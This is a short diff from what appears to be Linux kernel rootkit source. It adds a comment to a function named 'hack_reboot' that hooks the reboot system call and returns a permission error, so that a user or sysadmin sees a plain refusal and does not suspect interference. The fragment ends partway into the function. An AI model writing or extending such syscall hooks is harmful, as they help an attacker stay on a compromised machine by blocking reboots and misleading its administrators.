@@ -1,6 +1,8 @@
 #include <linux/linkage.h>
 #include <linux/errno.h>
 
+
+// A hook for the reboot system call, just return no permissions(can change to IO error or somthing else) to redirect the attention of the user/sysadmin
 #ifdef PTREGS_SYSCALL_STUB
 static asmlinkage int hack_reboot(const struct pt_regs *regs){
     return EPERM; //return error when trying to reboot
